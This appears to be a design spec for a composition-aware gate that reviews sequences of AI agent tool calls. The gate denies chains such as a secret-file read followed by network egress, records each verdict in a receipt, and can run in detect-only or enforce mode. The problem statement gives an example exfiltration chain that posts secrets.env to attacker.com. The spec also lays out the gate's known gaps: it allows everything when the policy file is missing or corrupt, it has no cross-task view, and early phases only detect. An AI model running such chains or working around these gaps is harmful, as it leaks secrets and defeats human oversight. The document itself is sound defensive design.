# GOV-GAP-CHAIN-001: Composition-Aware Capability Gating

Status: `deferred` (v2 hardening — hook point required now, full engine later)

## Problem

Current gating evaluates individual tool calls in isolation. A single
`read_file` is fine. A single `http_post` is fine. But `read_file(secrets.env)`
followed by `http_post(attacker.com, body=contents)` is an exfiltration chain.

The governor has no gate that reasons about **composed sequences** of actions.
Each step passes its own gate independently; the compound effect is unreviewed.

This is Pattern A from the Feb 2026 threat intelligence review: real-world
attacks chain benign-looking tool calls into harmful compositions.

## What This Is NOT

- Not a generic graph execution engine
- Not a planner or scheduler
- Not symbolic AI reasoning about "intent"
- Not blocking all multi-step workflows

It is a **denied-compositions rule table** evaluated against a per-task
action DAG. Small, deterministic, auditable.

## Minimal v1 Behavior

### Per-task action DAG

Each governed task accumulates an action log:

```
step_1: read_file(path="/app/secrets.env")  → capability: file_read, sensitivity: secret_candidate
step_2: http_post(url="https://ext.com/api") → capability: network_egress, sensitivity: none
```

The DAG is flat for v1 (ordered list of steps). True DAG structure (branches,
parallel) is v2/v3.

### Action log identity and lifecycle

The action log is keyed by `correlation_id` — an opaque string assigned at
task creation time. The correlation_id is the partition key for all
composition queries and receipts.

**Reset semantics (when a new action log starts):**

| Trigger | Behavior |
|---------|----------|
| New task (new `correlation_id`) | Fresh log |
| Explicit reset (`chain.reset` RPC) | Fresh log, old log archived in receipt |
| Daemon restart | Logs persist per-session (loaded from `{governor_dir}/chain_logs/`) |
| Timeout | No implicit timeout in v1 — explicit reset only |

**Concurrency:** v1 assumes sequential tool dispatch within a task. If tools
run concurrently, each parallel branch gets its own sub-log keyed by
`correlation_id + branch_index`. v1 implementation MAY defer concurrent
support and reject interleaved steps with a clear error.

### Step annotation

Each step carries versioned vocabulary fields:

- `capability_class` (CapabilityClass v1): `file_read` | `file_write` | `network_egress` | `network_ingress` | `shell_exec` | `code_exec` | `model_call` | `unknown`
- `trust_domain` (TrustDomain v1): `local` | `same_org` | `external` | `unknown`
- `data_sensitivity` (DataSensitivity v1): `none` | `internal` | `secret_candidate` | `classified`

These are **versioned enums** (e.g. `cap-class-v1`, `trust-v1`, `sens-v1`),
not free strings. Unknown values from future versions → `unknown` + logged.

Annotation is mechanical (from tool name + argument inspection), not NLP.

**Annotation source tracking:** Each annotation field records its provenance:

```python
class AnnotationSource(str, Enum):
    PROVENANCE_MODULE = "provenance"       # from GOV-PRIM-PROV-001 (when available)
    INLINE_PATH_HEURISTIC = "path_heuristic"  # file path pattern matching
    TOOL_METADATA = "tool_metadata"         # tool self-reports
    FALLBACK = "fallback"                   # hardcoded default

@dataclass
class AnnotatedValue:
    value: str        # the enum value
    source: str       # AnnotationSource value
```

This matters for debugging false positives. Without it, you can't tell
whether `secret_candidate` came from a provenance label or a path heuristic.

### Failed tool calls

Failed tool calls (non-zero exit, exception, timeout) **are logged** in the
action log with `result_status="failed"`. They are **match-eligible** for
the "prior step" side of composition rules but **not match-eligible** as the
proposed step (a failed proposed step is not dispatched).

Rationale: a failed `read_file(secrets.env)` may still have leaked data into
model context. The conservative choice is to treat it as having occurred.

### Denied compositions (rule table)

```
# If any step with sensitivity >= secret_candidate precedes
# any step with capability == network_egress:
#   → DENY unless elevated_policy_approval

DENY  secret_candidate  →  network_egress     UNLESS  elevated_approval
DENY  file_write        →  shell_exec(target)  UNLESS  same_file_scope
DENY  shell_exec        →  network_egress     UNLESS  sandboxed_network
```

Rules are static, loaded from policy. Not learned, not adaptive.

### Rule evaluation semantics

**All rules are evaluated** against each (prior_step, proposed_step) pair.
This is not first-match-wins.

Output shape per evaluation:

- `matched_rule_ids`: all rules whose conditions matched (list, may be empty)
- `exception_results`: per matched rule, whether UNLESS clause was satisfied
- `effective_verdict`: DENY if any matched rule has unsatisfied UNLESS; ALLOW otherwise

**Precedence:** DENY is sticky — if any rule denies, the overall verdict is
DENY regardless of other rules that matched with satisfied exceptions.
ESCALATE (from policy augmentation) outranks ALLOW but not DENY.

**Multiple UNLESS clauses:** A rule may have at most one UNLESS clause in v1.
Multiple exception conditions require multiple rules (one per exception path).
This keeps rule evaluation simple and deterministic.

**Rule ordering:** Rules are unordered. Evaluation is deterministic because
all rules are evaluated and DENY-wins. `rule_id` is for tracing, not
precedence.

### Gate integration

- Hook point: after each tool call completes, before the next is dispatched
- The chain gate sees the full action log so far + the proposed next step
- Verdict: ALLOW / DENY / ESCALATE
- Receipt: gate="chain_composition", includes action_log_hash + rule_id

**Enforcement mode:**

| Mode | Behavior | When |
|------|----------|------|
| `detect_only` | Emit signal + receipt, do not block | Phase 2B burn-in |
| `enforce` | Block on DENY, escalate on ESCALATE | Phase 2C (after signal stabilizes) |

The `mode` field appears in every gate receipt and output. Phase 2B is
detect-only. Code that reads `verdict=DENY` must also check `mode` to
determine whether execution was actually blocked.

**Deduplicate behavior:** For the same `(rule_id, correlation_id, edge_key)`
triple (where `edge_key = H(prior_step_hash, proposed_step_hash)`), the gate
emits a full receipt on first match and a `repeat_count` increment on
subsequent matches within the same task. This prevents alert spam in noisy
runs while preserving first-occurrence detail.

### What the receipt captures

- `action_log_hash`: content-addressed hash of the action sequence so far
- `proposed_step`: the next action being evaluated (normalized, see below)
- `matched_rule_ids`: all rules that matched (list, may be empty)
- `exception_results`: per rule, whether UNLESS was satisfied
- `verdict`: ALLOW / DENY / ESCALATE
- `history_length`: number of steps in the action log (not graph depth — v1 has no graph)
- `mode`: `detect_only` | `enforce`
- Policy fragment: canonical `PolicyReceiptFragment` shape (same as evidence gate)

**Canonicalization for `action_log_hash`:**

The hash covers a normalized step array. Per step, the hashed fields are:

```python
HASHED_STEP_FIELDS = [
    "step_index",           # position in log (int)
    "tool_id",              # which tool
    "capability_class",     # versioned enum value
    "trust_domain",         # versioned enum value
    "data_sensitivity",     # versioned enum value
    "result_status",        # "ok" | "failed" | "timeout"
    "args_hash",            # H(canonical_json(tool_arguments))
]
```

**Explicitly excluded from hash:** timestamps, durations, annotation sources,
tool output content, model reasoning. These are volatile / non-deterministic
and would break replay parity.

Hash function: `sha256(canonical_json(normalized_steps)).hexdigest()` using
the same `canonical_json` as gate_receipt.py.

### Policy file load semantics

The chain policy file (`{governor_dir}/chain_rules.json`) follows the same
lazy-load + cache pattern as the daemon's policy.json:

| State | `load_status` | Behavior |
|-------|---------------|----------|
| File exists, valid | `loaded` | Rules active |
| File missing | `missing_policy` | All ALLOW, receipted as `verdict_reason=no_policy` |
| File exists, corrupt | `corrupt_fallback` | All ALLOW, receipted as `verdict_reason=corrupt_policy` |
| File exists, zero rules | `loaded_empty` | All ALLOW, receipted as `verdict_reason=empty_rules` |

These four states are distinguishable in receipts and `chain.status` output.
"Quiet because configured that way" looks different from "quiet because broken."

## Existing Machinery

| Component | Relevance |
|-----------|-----------|
| Scope governor | Already constrains *where* — chain gate constrains *sequences* |
| Evidence gate | Per-step gating — chain gate adds cross-step awareness |
| Codex hooks | Post-hoc NDJSON event log — chain gate can consume this |
| Lane routing | Task-level routing — chain gate is per-step within a task |
| Preflight | Pre-session checks — chain gate is runtime, within session |
| Policy engine | Substrate for severity augmentation — chain gate is second consumer |
| Receipt kernel redaction | 13 secret patterns — reuse for sensitivity heuristic |

## v2 vs v3

**v2 (now):** Hook point in the tool dispatch path. Flat action log per task.
Denied-compositions rule table. Receipt emission. This is the gate *interface*
— it must exist even if the rule set starts tiny.

**v3 (later):** True DAG structure. Cross-task composition awareness.
Probabilistic chain risk scoring. Policy learning from receipt corpus.

## Implementation Sketch

1. `src/governor/chain_gate.py` — ChainGate, ActionStep, CompositionRule, ActionLog
2. Wire into daemon as `chain.*` RPCs (evaluate, status, rules)
3. Policy file: `{governor_dir}/chain_rules.json` (list of denied compositions)
4. Receipt emission via gate_receipt pattern + canonical PolicyReceiptFragment
5. CLI: `governor chain status`, `governor chain rules`

## Tests (minimum)

- Single step always ALLOW (no composition to deny)
- `secret_read → network_egress` triggers DENY
- Same chain with `elevated_approval` override → ALLOW + receipted
- Action log hash is stable across identical sequences
- Action log hash excludes timestamps (replay parity)
- Rule table loads from policy file
- All four load states distinguishable (loaded, missing, corrupt, empty)
- Receipt fields present and schema-valid
- PolicyReceiptFragment shape matches canonical contract
- Failed step logged and match-eligible as prior
- Failed step not match-eligible as proposed
- Annotation source tracked per field
- Dedupe: second match for same edge → repeat_count, not full receipt
- detect_only mode: DENY verdict + mode=detect_only in receipt
- All rules evaluated (not first-match-wins)
- DENY sticky across multiple rule matches
- History_length correct (not graph depth)
- Vocabulary enum values reject unknown strings

## Resolved Questions

- **Action log persistence:** Yes, per-session, in `{governor_dir}/chain_logs/`.
  Keyed by `correlation_id`.
- **Sync vs async:** detect_only mode is always non-blocking. enforce mode is
  synchronous (blocks tool dispatch).
- **Lane routing interaction:** Lane determines capability set; chain gate
  evaluates sequences within that set. No cross-concern dependency.
- **Failed tool calls:** Logged with `result_status=failed`, match-eligible
  as prior step, not as proposed step.
- **Composition depth:** Renamed to `history_length` (step count in log).
  No graph depth semantics in v1.

## Open Questions (deferred to v3)

- Cross-task composition awareness (shared correlation_id patterns)
- Concurrent tool dispatch (parallel branch sub-logs)
- Rule learning from receipt corpus
- Provenance label integration (currently inline heuristic only)
